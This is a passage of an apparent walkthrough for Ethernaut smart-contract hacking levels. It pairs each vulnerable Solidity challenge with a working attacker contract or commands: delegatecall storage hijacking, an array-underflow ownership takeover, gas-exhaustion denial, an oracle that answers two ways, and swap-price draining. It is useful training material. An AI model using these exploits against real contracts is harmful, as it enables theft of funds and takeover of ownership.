  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
Level author:
Adrian Manning
age@agemanning.com
https://github.com/AgeManning

Solution:

```
// SPDX-License-Identifier: MIT
pragma solidity >0.5.0;

import '@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol';

import "hardhat/console.sol";

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

// this one will be called by delegatecall
contract PreservationAttackerLib {
    // needs same storage layout as Preservation, i.e.,
    // we want owner at slot index 2
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}

contract PreservationAttacker {
    IPreservation public challenge;
    PreservationAttackerLib public detour;

    constructor(address challengeAddress) public {
        challenge = IPreservation(challengeAddress);
        detour = new PreservationAttackerLib();
    }

    function attack() external {
      // 1. change the library address to our evil detour lib
      // this works because their LibraryContract is invoked using delegatecall
      // which executes in challenge contract's context (uses same storage)
      challenge.setFirstTime(uint256(address(detour)));

      // 2. now make challenge contract call setTime function of our detour
      challenge.setFirstTime(0);
    }
}
```


## Recovery
Difficulty 6/10

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

To compute the address of the contract you need to know the creator’s address (in our case the instance address) and the nonce (in this case 1, as this contract’s creation is its first transaction). In the hardhat create a script using this:

```
const ethers = require("ethers");

async function main() {
  let x = ethers.utils.getContractAddress({
    from: "YOUR INSTANCE",
    nonce: ethers.BigNumber.from(`1`),
  });

  console.log(x);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
```


this command that some have given doesn't quite work: ```web3.utils.soliditySha3("0xd6", "0x94", instance_address, “0x01”)```, the address will be the first 20 bytes (=160 bits).

Using this address call destroy function:

```const simple = await (await ethers.getContractFactory('SimpleToken')).attach('THE ADDRESS YOU GOT ABOVE')```

```simple.destroy("YOUR OWN ADDRESS")```

Before then you need to compile SimpleToken in your hardhat to get its ABI

Contract addresses are deterministic and are calculated by keccack256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).

Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

An interesting blog post by Martin Swende details potential use cases of this.

If you're going to implement this technique, make sure you don't miss the nonce, or your funds will be lost forever.

## MagicNumber
Difficulty 6/10

To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.

Easy right? Well... there's a catch.

The solver's code needs to be really tiny. Really reaaaaaallly tiny. Like freakin' really really itty-bitty tiny: 10 opcodes at most.

Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That's right: Raw EVM bytecode.

Good luck!

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```

Study OPCODES, deploy a contract with ```web3.eth.sendTransaction({ from: "YOUR OWN ADDRESS", data: '0x69602a60005260206000f3600052600a6016f3' })``` and then 
```await contract.setSolver("THE NEW CONTRACT ADDRESS")```

This will give you the answer. More info on https://listed.to/@r1oga/13786/ethernaut-levels-16-to-18

## Alien Codex
Difficulty 7/10

You've uncovered an Alien contract. Claim ownership to complete the level.

  Things that might help

Understanding how array storage works
Understanding ABI specifications
Using a very underhanded approach


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

Hack
Analyse storage layout

Slot #	Variable
0	contact bool(1 bytes] & owner address (20 bytes), both fit on one slot
1	codex.length
keccak256(1)	codex[0]
keccak256(1) + 1	codex[1]
2²⁵⁶ - 1	codex[2²⁵⁶ - 1 - uint(keccak256(1))]
0	codex[2²⁵⁶ - 1 - uint(keccak256(1)) + 1] --> can write slot 0!
call make_contact to be able to pass the contacted modifer

call retract: this provokes and underflow which leads to code.length = 2^256 - 1
Method retract doesn't have a check for int underflow. By calling it, we would change codex length from 0 to 2**256 - 1. EVM storage size is exactly 2**256-1 slots of 32 bytes. Essentially by setting the length of codex to the length of EVM storage, we gain the ability to modify any slot of entire EVM storage.


Compute codex index corresponding to slot 0: 2²⁵⁶ - 1 - uint(keccak256(1)) + 1 = 2²⁵⁶ - uint(keccak256(1))


We have to figure out the location of _owner variable on storage as well as offset index to modify it with revise method.
_owner variable is located at 0 slot of contract's storage. Codex array length is located at 1 slot of storage. That is because of EVM optimize storage and address type takes 20 bytes, bool take 1 byte, so they both fit in one 32 bytes slot.

Now we have to calculate index i for revise method. Start of codex array on the EVM storage located at keccak256(bytes32(1)) according to allocation rules. Thus our target location would be index = 2 ** 256 - uint(one);.

```
contract Calc {
    
    bytes32 public one;
    uint public index;
    uint public length;
    bytes32 public lengthBytes;
    
    function getIndex() {
        one = keccak256(bytes32(1));
        index = 2 ** 256 - 1 - uint(one) + 1;
    }
    
    function getLength() {
        length = 2 ** 200 + 1;
        lengthBytes = bytes32(length);
    }
}
```

The index will be 35707666377435648211887908874984608119992236509074197713628505308453184860938


Call revise passing it index and your address left padded with 0 to total 32 bytes as content

Setting Contact to True
Method make_contact sets contact to true, 

Hash of the signature of the function would be await web3.utils.sha3('make_contact()'), which results to 0x58699c5546b14433a9f2a3b57db9b54a4d55329ad8fe08f84e85fb05403fa215. We are going to take first 4 bytes, so 0x58699c55 our desired result.

We can call make_contact method to set contact to true -

```await web3.eth.sendTransaction({to: contract.address, data: data, from: player, gas: 900000})```

or just ```await contract.make_contact()```

A result of ```await contract.contact()``` should change to true.

Then call retract(): ```await contract.retract()```

Call ```await contract.contact()``` 


## Denial
Difficulty 5/10

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call.value(amountToSend)("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
Level author:
Adrian Manning
age@agemanning.com

The goal is to make the withdraw call fail. We control the partner contract. The contract writer’s idea was that even if we revert in our contract using revert / require only our function call would fail but the withdrawal to the original owner would still continue. While this is true, notice that our function is being called using .call without specifying an explicit gas limit. We can just consume all available gas in the transaction resulting in the caller function to be out of gas and fail. Contrary to revert and require, the assert instruction consumes all gas.

1 Deploy
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialAttacker {
    fallback() external payable {
      // assert consumes all (!) gas
      assert(false);
    }
}
```

2. Take note of contract address
3. ```await contract.setWithdrawPartner("YOUR CONTRACT ADDRESS")```
4. ```await contract.withdraw()``` will fail out of gas



## Shop
Difficulty 4/10

Сan you get the item from the shop for less than the price asked?

Things that might help:
Shop expects to be used from a Buyer
Understanding how gas() options works
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3300)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3300)();
    }
  }
}
```
Level author:
Ivan Zakharov
34x4p08@gmail.com
https://github.com/34x4p08


In this level, we need to exploit interface Buyer. Our function price has to return different values, in two different calls. The only problem is that we can't use storage since just modifying value costs 5000 gas and we have only 3000 available. Good thing is that isSold variable from Shop contract is public and we can access it with the gas we have.

```
pragma solidity ^0.6.0;

interface Shop {
    function buy() external;
}

contract Hacker {
    
    Shop public shop;
    
    constructor(address shopAddr) public {  //pass your shop instance address when deploying as a constructor param
        shop = Shop(shopAddr);
    }
    
  function price() external view returns (uint) {
      assembly {
        mstore(0x100, 0xe852e741)
        mstore(0x120, 0x0)
        let result := staticcall(gas(), sload(0x0), 0x11c, 0x4, 0x120, 0x20)
        if iszero(mload(0x120)) {
          mstore(0x150, 0x64)
          return(0x150, 0x20) 
        }
        mstore(0x150, 0x0)
        return(0x150, 0x20) 
    }
        
    // return shop.isSold() ? 1: 101; //this reverts the contract so using the above assembly instead to toggle between 0 and 100

  }

function hack() public {
        shop.buy();
    }
    
}
```

## Dex
Difficulty 3/10

The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

 

Quick note
Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, <uint amount>) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.

  Things that might help:

How is the price of the token calculated?
How does the swap method work?
How do you approve a transaction of an ERC20?
Sources
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract Dex  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(spender, amount);
    SwappableToken(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
Level author:
Patrick Collins
patrick@alphachain.io
http://alphachain.io/blogs/

This challenge is solved via simply calling token swaps until one of the sides gets to 0 and errors the price calc:

```await contract.swap("token1","token2", XX)``` and vice versa

```(await contract.balanceOf("token1 or 2", player)).toNumber()``` = should become 0